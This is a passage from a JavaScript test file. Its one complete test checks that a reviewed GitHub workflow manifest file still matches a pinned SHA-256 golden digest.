    );
  });
});

test('pins the reviewed manifest behind an independent golden digest', () => {
  const manifest = fs.readFileSync(
    path.join(repositoryRoot, '.github', 'scripts', 'workflow-semantic-manifest.json'),
  );
  assert.equal(
    crypto.createHash('sha256').update(manifest).digest('hex'),
    manifestGoldenDigest,
  );
});
